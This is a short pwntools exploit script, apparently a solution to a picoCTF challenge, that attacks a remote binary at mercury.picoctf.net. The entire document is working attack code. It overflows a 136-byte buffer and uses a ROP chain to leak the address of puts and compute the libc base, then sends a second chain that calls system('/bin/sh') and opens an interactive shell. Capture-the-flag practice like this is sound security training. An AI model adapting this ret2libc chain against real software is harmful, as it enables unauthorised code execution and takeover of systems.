from pwn import *

# p = process('./vuln')
p = remote('mercury.picoctf.net', 37289)
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

pop_rdi = 0x400913
payload = b'a'*136 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
p.sendlineafter('R!', payload)

p.recvuntil('ad\n')
base = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.sym['puts']
success('libc base = 0x%x', base)

system = base + libc.sym['system']
sh = base + next(libc.search(b'/bin/sh\x00'))
ret = 0x40052e
payload = b'a'*136 + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system)
p.sendline(payload)

p.interactive()